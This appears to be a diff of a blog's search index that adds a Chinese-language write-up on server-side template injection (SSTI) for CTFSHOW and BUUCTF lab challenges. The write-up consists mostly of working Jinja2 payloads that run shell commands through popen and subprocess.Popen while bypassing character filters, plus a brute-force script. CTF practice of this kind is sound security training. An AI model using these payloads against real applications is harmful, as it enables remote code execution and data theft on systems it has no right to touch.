@@ -4,7 +4,36 @@
   
     
     <entry>
-      <title>ctfshow-web入门-爆破</title>
+      <title>SSTI漏洞分析</title>
+      <link href="/posts/62cc.html"/>
+      <url>/posts/62cc.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="SSTI漏洞原理">SSTI漏洞原理</h2><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h2 id="如何判断检测SSTI漏洞的存在">如何判断检测SSTI漏洞的存在</h2><p>输入的数据会被浏览器利用当前脚本语言调用解析执行</p><h2 id="SSTI会产生在那些语言应用">SSTI会产生在那些语言应用</h2><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282225738.png" alt=""></p><h2 id="SSTI安全问题在生产环境哪里产生">SSTI安全问题在生产环境哪里产生</h2><ul class="lvl-0"><li class="lvl-2"><p>存在模板引用的地方，如404错误页面展示</p></li><li class="lvl-2"><p>存在数据接收引用的地方，如模板解析获取参数数据</p></li></ul><h2 id="CTF案例讲解">CTF案例讲解</h2><p><strong>以下是CTFSHOW靶场案例：</strong></p><h3 id="web361">web361</h3><p>题目：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282225574.png" alt=""></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226599.png" alt=""></p><h3 id="web362">web362</h3><p>这一关过滤了2、3等数字，os_os._wrap_close这个类没法使用，利用<mark>subprocess.Popen()</mark></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226342.png" alt=""></p><h3 id="web363">web363</h3><p>这一关是过滤双引号，考虑使用<mark>get</mark>传参绕过</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web364">web364</h3><p>这一关是过滤了<mark>args</mark>，考虑用用<mark>request.values</mark></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web365">web365</h3><p>这一关属于过滤方括号，可以用==<em>getitem</em>==绕过</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web366">web366</h3><p>这一关过滤了下划线，换一个更简单获取<mark>popen</mark>方法的类</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&amp;a=cat /flag&amp;b=__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web367">web367</h3><p>这一关过滤了os，可以通过<mark>get</mark>来获取</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web368">web368</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">这一关过滤了request，是在{{}}中过滤了request，没有在{% %}过滤request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web369">web369</h3><p>写一个脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl="http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name={{% print (config|string|list).pop({}).lower() %}}"payload="cat /flag"result=""for j in payload:    for i in range(0,1000):        r=requests.get(url=url.format(i))        location=r.text.find("&lt;h3&gt;")        word=r.text[location+4:location+5]        if word==j.lower():            print("(config|string|list).pop(%d).lower()  ==  %s"%(i,j))            result+="(config|string|list).pop(%d).lower()~"%(i)            breakprint(result[:len(result)-1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终的payload：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以参考以下大佬的</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">http://ec6b99bb-953a-4e28-8962-084bda49c739.chall.ctf.show/?name={% set po=dict(po=a,p=a)|join%}{% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}{%print(x.open(file).read())%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>下面是buuctf上面的一个靶场：</strong></p><h3 id="WesternCTF2018-shrine">[WesternCTF2018]shrine</h3><p>题目：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226992.png" alt=""></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">/shrine/{{url_for.__globals__['current_app'].config}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226690.png" alt=""></p><p>**参考文章：**<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> CTFSHOW </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTFSHOW-web入门-爆破</title>
       <link href="/posts/4921.html"/>
       <url>/posts/4921.html</url>
       
@@ -20,9 +49,9 @@
       
         <tags>
             
-            <tag> CTF </tag>
+            <tag> CTFSHOW </tag>
             
-            <tag> ctfshow </tag>
+            <tag> CTF </tag>
             
             <tag> 爆破 </tag>
             
@@ -33,7 +62,7 @@
     
     
     <entry>
-      <title>ctfshow-web入门-信息收集</title>
+      <title>CTFSHOW-web入门-信息收集</title>
       <link href="/posts/fd5.html"/>
       <url>/posts/fd5.html</url>
       
@@ -49,11 +78,11 @@
       
         <tags>
             
+            <tag> CTFSHOW </tag>
+            
             <tag> CTF </tag>
             
             <tag> 信息收集 </tag>
-            
-            <tag> ctfshow </tag>
             
         </tags>
       
@@ -78,9 +107,9 @@
       
         <tags>
             
-            <tag> 信息收集 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> 信息收集 </tag>
             
         </tags>
       
